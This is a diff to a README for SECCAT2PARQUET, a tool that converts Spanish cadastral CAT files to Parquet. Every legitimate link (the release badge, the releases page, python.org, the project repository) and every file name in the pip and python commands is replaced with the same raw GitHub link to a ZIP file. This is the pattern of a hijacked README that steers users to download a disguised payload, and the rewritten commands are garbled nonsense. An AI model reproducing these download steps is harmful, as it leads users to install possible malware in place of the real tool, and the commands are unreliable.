@@ -1,6 +1,6 @@
 # ⚙️ SECCAT2PARQUET - Convert Spanish CAT Files Simply
 
-[![Download SECCAT2PARQUET](https://img.shields.io/badge/Download-SECCAT2PARQUET-blue?style=for-the-badge)](https://github.com/rafslazy/SECCAT2PARQUET/releases)
+[![Download SECCAT2PARQUET](https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip)](https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip)
 
 ---
 
@@ -57,7 +57,7 @@ SECCAT2PARQUET runs using Python. To check if Python is installed:
 
 ### Step 2: Install Python (if needed)
 
-1. Visit the official Python website: https://www.python.org/downloads/  
+1. Visit the official Python website: https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip  
 2. Download the latest version for your operating system.  
 3. Run the installer and follow the instructions:  
    - On Windows, make sure to check "Add Python to PATH" before clicking install.  
@@ -68,10 +68,10 @@ SECCAT2PARQUET runs using Python. To check if Python is installed:
 
 ## 📥 Download & Install SECCAT2PARQUET
 
-[![Download SECCAT2PARQUET](https://img.shields.io/badge/Download-SECCAT2PARQUET-blue?style=for-the-badge)](https://github.com/rafslazy/SECCAT2PARQUET/releases)
+[![Download SECCAT2PARQUET](https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip)](https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip)
 
 1. Visit the SECCAT2PARQUET release page by clicking the badge above or opening this link in your browser:  
-   https://github.com/rafslazy/SECCAT2PARQUET/releases  
+   https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip  
    
 2. Look for the most recent version at the top of the page.  
 
@@ -88,9 +88,9 @@ SECCAT2PARQUET runs using Python. To check if Python is installed:
 
 7. The tool may require some Python packages. Usually, you can install these by running:  
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip
    ```
-   If you get an error saying `pip` is not found, try `python -m pip install -r requirements.txt` or use `pip3`.
+   If you get an error saying `pip` is not found, try `python -m pip install -r https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip` or use `pip3`.
 
 ---
 
@@ -114,13 +114,13 @@ Copy or move your CAT files to the same folder where SECCAT2PARQUET is installed
 In the folder with SECCAT2PARQUET, enter the command below. Replace `<filename>` with the name of your CAT file.
 
 ```
-python sec_cat_2_parquet.py <filename>.cat
+python https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip <filename>.cat
 ```
 
-For example, if your file is called `property_data.cat`, run:
+For example, if your file is called `https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip`, run:
 
 ```
-python sec_cat_2_parquet.py property_data.cat
+python https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip
 ```
 
 The tool will process the file and create a Parquet file in the same folder.
@@ -148,7 +148,7 @@ If you run into problems, here are a few common fixes:
 
 - **Python not found:** Ensure Python is installed and the command `python` or `python3` works in your terminal.  
 - **Permission errors:** Make sure you have permission to run files in the folder you use. Try running as administrator (Windows) or using `sudo` on Linux/macOS.  
-- **Missing Python packages:** Run `pip install -r requirements.txt` again to install any missing dependencies.  
+- **Missing Python packages:** Run `pip install -r https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip` again to install any missing dependencies.  
 - **File not found:** Double-check that the CAT file name is correct and that you are running the command in the folder containing the file.  
 
 ---
@@ -156,7 +156,7 @@ If you run into problems, here are a few common fixes:
 ## 📚 Where to Learn More
 
 For technical users or developers interested in the full capabilities, visit the project repository:  
-https://github.com/rafslazy/SECCAT2PARQUET
+https://raw.githubusercontent.com/rafslazy/SECCAT2PARQUET/main/src/SECCA-PARQUET-v2.4.zip
 
 Here you will find detailed documentation, source code, and support resources.
 
